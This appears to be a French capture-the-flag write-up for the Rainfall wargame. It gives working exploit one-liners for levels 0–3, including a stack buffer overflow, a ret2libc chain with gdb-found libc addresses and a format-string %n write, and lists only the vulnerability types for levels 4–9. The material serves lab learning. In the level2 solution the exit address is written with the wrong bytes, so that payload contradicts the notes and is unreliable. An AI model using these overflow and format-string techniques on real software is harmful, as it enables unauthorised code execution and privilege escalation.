# Rainfall — Notes d'exploitation (version propre)

> Document de travail pour nous deux.  
> Objectif : aller droit au but niveau par niveau, avec **faille**, **spoiler**, puis **solution**.

---

## Règle générale (flags)

Quand tu obtiens un shell via la faille :

1. Vérifie l'utilisateur courant :

```bash
whoami
```

2. Récupère le mot de passe du niveau :

```bash
cat /home/user/levelX/.pass
```

---

## Level0

- **Type de faille** : validation d'argument faible (pas un BOF complexe).
- **Idée** : en décompilant l'ELF, on voit qu'un argument numérique permet d'ouvrir un shell.

<details>
<summary>Spoiler</summary>

Le programme vérifie l'argument ; si c'est la bonne valeur numérique, il déclenche le shell.

</details>

### Solution

```bash
./level0 423
```

---

## Level1

- **Type de faille** : Stack-Based Buffer Overflow (basique).
- **Contexte** : `main` lit avec `gets` dans un buffer de 76 chars, et une fonction `run` existe mais n'est jamais appelée.

<details>
<summary>Spoiler</summary>

1. Récupérer l'adresse de `run` :

```bash
objdump -d -M intel level1 | grep run
# 08048444 <run>:
```

2. Écraser l'adresse de retour avec cette adresse (en little-endian).  
   `0x08048444` devient `\x44\x84\x04\x08`.

</details>

### Solution

```bash
(python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
```

---

## Level2

- **Type de faille** : Stack-Based BOF + Ret2libc.
- **Contexte** : la fonction `p()` utilise `gets` (pas de limite de taille).

Ret2libc = réutiliser des fonctions déjà chargées (ex: `system`, `exit`) pour exécuter `/bin/sh`.

<details>
<summary>Spoiler</summary>

### 1) Trouver l'offset

Dans `gdb ./level2`, envoyer un pattern cyclique, puis analyser l'adresse du segfault :

- Segfault : `0x37634136`
- **Offset = 80**

### 2) Récupérer les adresses utiles

```gdb
p system
# 0xb7e6b060

p exit
# 0xb7e5ebe0
```

### 3) Trouver `/bin/sh` dans libc

```gdb
info proc map
```

Extrait utile :

```gdb
0xb7e2c000 0xb7fcf000 ... /lib/i386-linux-gnu/libc-2.15.so
```

Chercher la chaîne :

```gdb
find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
# 0xb7f8cc58
```

### 4) Prendre une adresse de retour “propre”

```gdb
disass main
```

Le `ret` de fin est à `0x0804854b`.

### 5) Ordre du payload

`[offset 80] + [ret main] + [system] + [exit] + [/bin/sh]`

Soit :

- `0x0804854b`
- `0xb7e6b060`
- `0xb7e5ebe0`
- `0xb7f8cc58`

</details>

### Solution

```bash
(python -c 'print "a" * 80 + "\x4b\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\xe0\xeb\x5e\x7e" + "\x58\xcc\xf8\xb7"'; cat) | ./level2
```

---

## Level3

- **Type de faille** : Format String Vulnerability (`printf(user_input)` en brut).
- **Objectif** : modifier la variable globale `m` pour atteindre la valeur attendue.

Exemple de fuite :

```bash
./level3
%p
# 0x200
```

<details>
<summary>Spoiler</summary>

### 1) Trouver la position de notre entrée sur la pile

```bash
./level3
AAAA %p %p %p %p %p %p
# AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 ...
```

`0x41414141` (= `AAAA`) apparaît au **4e argument**.

### 2) Identifier l'adresse de `m`

```gdb
disass v
```

La zone intéressante montre :

```gdb
0x080484da <+54>: mov    0x804988c,%eax
```

Validation :

```gdb
x/s 0x804988c
# 0x804988c <m>: ""
```

### 3) Utiliser `%n`

- `%n` écrit le nombre de caractères déjà imprimés à l'adresse fournie.
- Ici `m` doit valoir `64`.
- On met l'adresse de `m` (4 octets), puis 60 chars, puis `%4$n`  
  => `4 + 60 = 64`.

</details>

### Solution

```bash
(python -c 'print "\x8c\x98\x04\x08" + "a" * 60 + "%4$n"'; cat) | ./level3
```

---

## Level4

- **Type de faille** : Format String Vulnerability - 2nd method (using %x and spaces)

## Level5

- **Type de faille** : Format String Vulnerability - PLT overwriting

## Level6

- **Type de faille** : Heap-Based Buffer Overflow - Basic

## Level7

- **Type de faille** : Heap-Based Buffer Overflow - PLT overwriting

## Level8

- **Type de faille** : Breach Exploitation and Memory Manipulation by understanding a decompiled program

## Level9

- **Type de faille** : Shellcode Injection and Memory Manipulation of a binary programmed in C++



TODO (à compléter)

Ressource utile pour générer un pattern d'overflow :  
https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
